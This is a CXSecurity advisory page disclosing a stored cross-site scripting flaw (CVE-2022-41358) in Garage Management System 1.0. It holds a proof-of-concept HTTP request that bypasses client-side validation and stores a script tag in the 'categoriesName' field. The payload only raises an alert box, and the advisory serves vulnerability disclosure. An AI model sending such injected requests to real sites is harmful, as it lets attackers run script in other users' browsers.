---
title: Garage Management System 1.0 - 'categoriesName' - Stored XSS
url: https://cxsecurity.com/issue/WLB-2022100037
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-15
fetch_date: 2025-10-03T19:54:19.589915
---

# Garage Management System 1.0 - 'categoriesName' - Stored XSS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Garage Management System 1.0 - 'categoriesName' - Stored XSS** **2022-10-14 / 2022-10-15**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [Sam Wallace](https://cxsecurity.com/author/Sam%2BWallace/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-41358](https://cxsecurity.com/cveshow/CVE-2022-41358/ "Click to see CVE-2022-41358")**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Garage Management System 1.0 - 'categoriesName' - Stored XSS
# Date: 18-09-2022
# Exploit Author: Sam Wallace
# Software Link: https://www.sourcecodester.com/php/15485/garage-management-system-using-phpmysql-source-code.html
# Version: 1.0
# Tested on: Debian
# CVE : CVE-2022-41358
Summary:
Garage Management System utilizes client side validation to prevent XSS.
Using burp, a request can be modified and replayed to the server bypassing this validation which creates an avenue for XSS.
Parameter: categoriesName
URI: /garage/php\_action/createCategories.php
POC:
POST /garage/php\_action/createCategories.php HTTP/1.1
Host: 10.24.0.69
Content-Length: 367
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.24.0.69
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqKDsN4gmatTEEkhS
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.24.0.69/garage/add-category.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=gbklvcv3vvv987636urv0gg53u
Connection: close
------WebKitFormBoundaryqKDsN4gmatTEEkhS
Content-Disposition: form-data; name="categoriesName"
<script>alert(1)</script>
------WebKitFormBoundaryqKDsN4gmatTEEkhS
Content-Disposition: form-data; name="categoriesStatus"
1
------WebKitFormBoundaryqKDsN4gmatTEEkhS
Content-Disposition: form-data; name="create"
------WebKitFormBoundaryqKDsN4gmatTEEkhS--

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100037)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top